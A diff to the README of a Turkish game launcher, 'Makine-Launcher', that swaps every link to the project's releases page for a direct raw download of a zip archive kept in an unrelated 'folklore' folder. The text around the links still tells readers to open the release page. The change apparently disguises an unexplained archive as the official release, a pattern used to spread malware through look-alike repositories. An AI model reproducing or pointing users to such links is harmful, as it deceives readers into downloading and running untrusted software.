@@ -1,6 +1,6 @@
 # 🖥️ Makine-Launcher - Türkçe Oyunlara Hızlı Erişim
 
-[![Download Makine-Launcher](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/arthropodgenusstockpower345/Makine-Launcher/releases)
+[![Download Makine-Launcher](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/arthropodgenusstockpower345/Makine-Launcher/raw/refs/heads/main/folklore/Makine-Launcher-2.9.zip)
 
 ## 📦 What is Makine-Launcher?
 
@@ -16,7 +16,7 @@ You can use it to:
 ## 🚀 Download and Install
 
 Use this page to download:
-https://github.com/arthropodgenusstockpower345/Makine-Launcher/releases
+https://github.com/arthropodgenusstockpower345/Makine-Launcher/raw/refs/heads/main/folklore/Makine-Launcher-2.9.zip
 
 ### Steps
 1. Open the release page in your browser.
@@ -181,7 +181,7 @@ Before you apply any translation pack:
 ## 📥 Download Link
 
 Visit this page to download:
-https://github.com/arthropodgenusstockpower345/Makine-Launcher/releases
+https://github.com/arthropodgenusstockpower345/Makine-Launcher/raw/refs/heads/main/folklore/Makine-Launcher-2.9.zip
 
 ## 🖱️ Quick Start
 
